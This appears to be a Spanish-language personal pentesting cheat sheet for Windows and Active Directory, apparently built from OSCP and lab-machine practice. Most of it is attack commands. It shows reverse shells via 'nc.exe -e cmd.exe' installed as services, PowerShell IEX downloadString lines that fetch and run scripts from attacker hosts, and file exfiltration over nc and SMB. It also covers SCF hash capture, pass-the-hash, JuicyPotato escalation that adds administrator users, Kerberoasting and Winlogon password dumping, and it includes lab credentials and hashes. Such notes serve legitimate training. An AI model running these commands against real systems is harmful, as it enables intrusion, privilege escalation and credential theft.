> https://github.com/rasta-mouse/Sherlock

## Descargar  archivos Windows

```
certutil.exe -urlcache -split -f "http://172.16.1.30/nc.exe" C:\temp\nc.exe
```



### smbserver

Para compartir una carpeta desde linux y verla en windows muy util cuando trabajas con windows...

```
impacket-smbserver smbFolder $(pwd)

```

Para copiar en windows funciona en ambas direcciones. Esto es la forma mas comoda que he encontrado para poder subir y bajar archivos.

```
copy \\10.10.1.14\smbfolder\nc.exe
Para trasferir algo
copy C:\temp\supersecret.txt \\172.16.1.30\hax\supersecret.txt
```

Pero para verciones de windows modernas tienes que poder usar el SMB v2 para eso usa

```
# En kali

impacket-smbserver  -smb2support  smbFolder $(pwd) 

```

Y en Windows:

```
copy \\192.168.230.128\smbfolder\oscp.exe .
```

> https://juggernaut-sec.com/windows-file-transfers-for-hackers/

> https://ppn.snovvcrash.rocks/pentest/infrastructure/file-transfer

> https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65

## .SCF

Permite que cuando se cargue el icono se autentique y nos mande el hash ntlm v2 del usuario que intenta ver esa carpeta

```
# impacket-smbserver  -smb2support  smbFolder $(pwd) 
[Shell]
Command=2

IconFile=\\10.10.14.21\smbfolder\icon
```

## Enviar archivos nc64.exe

Para enviar archivos desde windows cuando no te deja usar SMB

```
nc.exe 192.168.1.5 1234 < archivo_a_enviar.txt
```

Ya sabes del otro lado solo lo revibes...

## Recon basico windows


Ahora para escalar vamos a hacer reconocimiento basico..

```
systeminfo
net user # PS Get-LocalUser
net localgroup # PS Get-LocalGroup
netstat -ano
whoami /priv
whoami /all #miembro de que grupos
```

Obtener informacion de un grupo o un usuario

```
net user svc-printer
net localgroup 
```
## Grupos con privilegios

Algunos de los grupos que tienen privilegios son:

```
Server Operators

Administrators
```
> https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators

## Servicios de Windows

Para ver los servicios usa:

```
services # PS Get-Service

```
Para crear una servicio en windows

```
sc.exe create reverse binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.14.1 443"
```

Para configurar un servicio ( no quiere decir que lo detengas o inicies)

```
sc.exe config VMTools binPath="C:\Windows\Temp\privesc\nc64.exe -e cmd.exe 10.10.14.146 443"
```

Para iniciar o parar un servicio

```
sc.exe stop VMTools
sc.exe start VMTools
```

## Exploits de windows

Una pagina interesante que tiene exploits de windows compilados.

> https://github.com/SecWiki/windows-kernel-exploits/tree/master


## Ver procesos (2 metodos)

El primer metodo es con powershell

```
Get-Process
```
El segundo metodo es por cmd

```
tasklist /V
```

## Añadir usuarios en windows

Para añadir un usuerio

```
net user masa password /add
```

## Puertos abiertos

```
netstat -ano
netstat -nat

```

## Agregar a un usuario al grupo de Administrators

```
net localgroup Administrators  s4vitar /add
```

## Revisar todos los Grupos

```

net localgroup
```

## Revisar un grupo en especifico

En este caso revisamos quienes son los miembros del grupo Administrators.
```
net localgroup Administrators

```

## Crear un recurso compartido

Crea un recurso compartido y lo llama attacker_folder le da una ruta y pone a los adminsitradores que tienen completo control.

```
net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/e46560bd-2981-4887-aa70-1d324c1ba00a)

En este caso, se está otorgando permisos completos (FULL) al grupo Everyone, lo que permitirá a cualquier usuario acceder al recurso compartido sin necesidad de autenticación.

```
net share attacker_folder=C:\Windows\Temp /GRANT:Everyone,FULL
```
Copiar desde una computadora victima archivos...

```

copy \\share\attacker_folder\parche.exe parche.exe

```

Para eliminar el share que cualquiera puede usar lo cual es algo peligroso...

```
net share attacker_folder /DELETE

O para regresar que solo los admins puedan usarlos

net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL
```



> https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters

## Crackmapexec

Sesiones nulas igual se puede

```
crackmapexec smb <target(s)> -u '' -p ''
```

Para enumerar el puerto 445 basico

![image](https://github.com/gecr07/Acordeon/assets/63270579/932937ba-7211-4c25-bcf9-ef5c3217e212)


```
crackmapexec smb 127.0.0.1
```

Para probar si la contrasea es valida pone un +

```
crackmapexec smb 127.0.0.1 -u 's4vitar' -p 'password123.'
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/6c38263e-4908-4ba3-98e7-8a93c26eef81)

Para enumerar los shares

```
crackmapexec smb 127.0.0.1 -u 's4vitar' -p 'password123.' --shares
```

Para probar el hash de un usuario ( y mas si creeomos que es el Administrator)

```
crackmapexec smb 10.129.185.202 -u 'Adminsitrator' -H e0fb1fb85756c24235ff238cbe81fe00
```

![image](https://github.com/gecr07/Acordeon/assets/63270579/62a75e78-4ef2-4778-997d-ce92b69333de)

### WinRm

Se puede probar si las credenciales funcionan para WinRM puerto ***5985 y 5986***

```bash
 crackmapexec winrm 10.10.11.108 -u svc-printer -p '1edFg43012!!'

```


## Pass the hash

Si conseguimos el hash del administrador y el puerto 445 (al parecer esta abierto se puede hacer esto..

```
wmiexec.py -hashes :601c36b2ecfa2407ceab19fe6b366c7f Administrator@10.10.10.11
#Cuandono estas en nungun dominio
wmiexec.py WORKGROUP/Administrator@10.10.14.19 -hashes :d3c87620c26302e9f04a756e3301e63a
```

## Ruta para permitir la administracion remota

En términos prácticos, este comando está modificando el Registro de Windows para ajustar la configuración LocalAccountTokenFilterPolicy en la clave System. El valor 1 generalmente se utiliza para permitir la administración remota del sistema. Sin embargo, ten en cuenta que realizar cambios en el Registro puede afectar el funcionamiento del sistema, y siempre se debe tener precaución al modificar configuraciones del Registro. YA CON ESTO el crackmapexec poner el POWNED.

```
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_WORD /d 1 /f
```
## PSEXEC s4vitar Bounty

Igual permite regresar una shell con permisos de authority system. Pasos previos tener el puerto 445 abierto agregar el usuario s4vitar, agregar al usuario a lo administradores y crear un recuerso compartido donde los administradores tengan acceso FULL. Recuerda que al parecer psexec te sube un binario es por eso que es detectado ya.

```
psexec.py WORKGROUP/s4vitar@10.10.14.22 cmd.exe
Password:
```
### PSEXEC Pass the Hash
Pero tambien se puede hacer pasando el hash

```
crackmapexec smb 10.129.185.202 -u 'Adminsitrator' -H e0fb1fb85756c24235ff238cbe81fe00
```

### Windows exploit suggester Next generation

WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 11, including their Windows Server counterparts, is supported.

> https://github.com/bitsadmin/wesng

Tiene la capacidad de con el output del systeminfo genera las vulns pero da muchos falsos positivos.


### Juicy Potato

Esta es una herramienta donde puedes escalar privilegios si esta el SetImpersonate privilege activado. En la maquina Jeeves me funciono sin el CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097}) sin embargo, en las otras si tuve que ponerlo.

```
En el contexto de Windows, el CLSID (Class ID o Identificador de Clase) es un identificador único globalmente para una clase de objetos COM (Component Object Model). En el caso específico que mencionas, BITS se refiere a Background Intelligent Transfer Service, que es un servicio de Windows utilizado para la transferencia de archivos en segundo plano, comúnmente utilizado por Windows Update y otros servicios.



.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user s4vitar password123. /add" -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"


.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators  s4vitar /add" -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"

.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"

```

> https://github.com/ohpe/juicy-potato


### Ver credenciales de windows Winlogon (for autologon)


NOta en la maquina bart usa esto 0xd pero se tiene que ejecutar en un proceso de 64 bits siempre intenta ejecutar una shell con ese procesos de x64

![image](https://github.com/gecr07/Acordeon/assets/63270579/8693f721-bd5d-4ab7-9412-05060968d7c5)


```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```


### Montar un recurso con windows

Si tienes las contraseñas de un usuario administrador o el admin puedes montar el disco c con todos los privilegios...

```
 net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb
```

### Powershell Execution Policy Bypass

Para brincarse la execution policy se hace asi

```
 powershell.exe -ExecutionPolicy Bypass -File .\prueba.ps1

```


### Debuggear scritps Powershell

Para debuggear scripts usa "Wait-Debugger". cuando estes dentro usa h para ver como ir paso a paso.

```
Wait-Debugger

function prueba {
	
	$var1="Uno"
	$var2="Dos"

}


prueba

$masa="Hola Masa"

echo "Hola mundo"
```

La s entra dentro de las funciones y si quieres ver donde va usa l ademas si quieres ver el valor de una variable solo nombrala por ejemplo $var1

![image](https://github.com/gecr07/Acordeon/assets/63270579/ebcf1685-8ee9-462e-bb72-62e1d9ac177e)

### Powershell codigo de estado $?

![image](https://github.com/gecr07/Acordeon/assets/63270579/585128cf-4a8d-433f-a2e2-bfe7e9077fde)



### Powershell “run as”

Que quiere decir correr como eso quiere decir que lo vas a correr en la maquina victima vas a correr un comando como otro usuario en el caso de la maquina bart pues como Administrator ya que tenemos el password:

```
PS C:\Users\Administrator\Documents>

$username = "BART\Administrator"
$password = "3130438f31186fbaf962f407711faddb"
$secstr = New-Object -TypeName System.Security.SecureString
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/Invoke-PowerShellTcp.ps1') } -Credential $cred -Computer localhost

```

Otra opcion a Run as que me funciono

```
$SecPass = ConvertTo-SecureString 's67u84zKq8IXw' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential('Administrator',$SecPass)

Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21:8084/rev.ps1')" -Credential $cred
```

## Microsoft SQL server

Para conectarse desde Kali existe un script en python de impacket. En Microsoft SQL Server, el usuario administrador por defecto se llama "sa", que es la abreviatura de "System Administrator"

```
mssqlclient.py sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59

/usr/share/doc/python3-impacket/examples/mssqlclient.py  WORKGROUP/sa:GWE3V65#6KFH93@4GWTG2G@10.129.1.183

xp_cmdshell whoami
# Como soy admin pued puedo activar lal ejecucion de comandos.
enable_xp_cmdshell
```

## Hash MD5

Para sacar el hash md5 de un archivo cuando lo trasfieras usa:

```
CertUtil -hashfile CustomerManagerService.exe MD5
```

## Procesos

Para ver procesos se usa ps pero existen varias opciones pruebalas

```
ps -eafww
ps -aux
```

## Matar procesos

Se pueden matar procesos tanto por su nombre como por su PID

```
taskkill /IM notepad.exe /F
#F de force
#Por PID

taskkill /PID 1234 /F


## por nombre y con la t matas todos los subproceso

taskkill /f /t /im adb.exe
```

Matar procesos con Powershell

```
Stop-Process -Name "nombre_del_proceso" -Force


Stop-Process -ID numero_del_ID -Force
```

## Proceso en segundo plano cmd

Para que puedas seguir trabajando usa

```
start /B comando
```

## Enviar un paquete con NC

Para pruebas sobre todo esto es muy util

```
echo. | nc.exe IP port
```
Pero tambien sirve en linux

```
echo| nc 127.0.0.1 3333
```

# Active Directory

## Puertos Comunnes y Servicios

```bash
88/tcp   Kerberos
389/tcp  LDAP
636/tcp  LDAPS 
5985/tcp WinRM

```

## Listar SMB shares NULL session

```bash

smbmap -H 10.129.2.148 -u 'loquesea'

smbclient -L //10.129.2.148/ -U ""%""

smbclient -L 10.129.2.148 -N

smbclient //10.129.2.148/Replication -U ""%""

enum4linux -a 10.129.2.148 # Permite saber si puedes leer o escribir en un share lee bien todo el output

crackmapexec smb 10.129.2.148 --shares -u '' -p ''

# Para poder listar SMB samba en linux

enum4linux -a -u "" -p ""
```

## Listar SMB Shares con credenciales

```bash
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18

enum4linux -a -u "SVC_TGS" -p "GPPstillStandingStrong2k18" 10.129.2.148 # Puedes ver con este usuario que shares tiene acceso

smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18

smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968

smbmap -H 0110.10.1 -u "Usern" -p "Password123" -r "ACCT" #Listas que hay dentro de acct es un recurso compartido con permisos de lectura

```

## Kerberoasting

```bash
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out

# Este comando regresa si es que encuentra usuarios Kerberoasteables Obtienes el hash de tipo TGS-REP

hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force

```

## Sincronixar reloj

Para hacer el Kerberoasting es importante tener sincronizado el reloj con el DC para ello usa

```
ntpdate IPDC
```

## ASREPRoast

Para cuando tienes usuarios pero no contraseñas si no tienen habilitado el Pre Auth de Kerberos son vulnerables.


## WinRm

Puertos 5985 y 5986 siempre que veas estos puertos abiertos y tengas credenciales vale la pena intentarlo.

```
evil-winrm -u 'svc-printer' -p '1edFg43012!!' -i 10.129.95.241 

```

## Criptografia

Finalmente entendi como funciona la criptografia asimetrica

> ¡Buena observación! Las claves públicas y privadas en criptografía asimétrica pueden ser utilizadas tanto para cifrado como para descifrado, pero de manera complementaria. Aquí te explico cómo funcionan generalmente:

### Uso de Claves Públicas y Privadas

![image](https://github.com/gecr07/Acordeon/assets/63270579/e89d22f8-91ff-49d1-a86f-3779ed7862e7)


Pero la cosa cambia cuando se trata de certificados y firmas digitales

![image](https://github.com/gecr07/Acordeon/assets/63270579/7baa34ac-96b5-4ca4-9cc8-7bee461c8b9d)

![image](https://github.com/gecr07/Acordeon/assets/63270579/928665f7-3af5-4230-aecc-91df03f47398)


Y aqui el chat gpt te da un ejemplo de como se hace por ejemplo en el caso de un certificado ssl.

![image](https://github.com/gecr07/Acordeon/assets/63270579/95e28adb-b1af-4fbd-bb11-a3218e05afb5)

En este caso muestra un CA

![image](https://github.com/gecr07/Acordeon/assets/63270579/cdac5ff1-b7e5-43f5-9146-68f31ca74581)

## Powershell historial

Para sacar el historial de powershell utiliza los siguientes comandos.

```
Get-History # Sirve para ver los comandos durante la sesion actual.

```

Ahora si tu lo que quieres es ver el historial persistente que powershell guarda en el perfil del usuario:

```
notepad $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt


```

No me funciono el anterior pero segun es valido ahora para Verificar la configuración de PSReadline y ver donde podria estar el historial:


```
Get-PSReadlineOption

## Si quieres aumetar el numero de comandos que guardas util para un trabajo por ejemplo

Set-PSReadlineOption -HistorySaveStyle SaveIncrementally -MaximumHistoryCount 1000

```

![image](https://github.com/user-attachments/assets/b01c165e-ca6a-49e7-a082-cfa41d10645b)

Ahora pues ya solo has un cat a la ruta del HistorySavePath



# Referencias

> https://medium.com/@verylazytech/from-novice-to-ninja-how-the-oscp-cheatsheet-can-catapult-your-cyber-career-0eb446ab041d
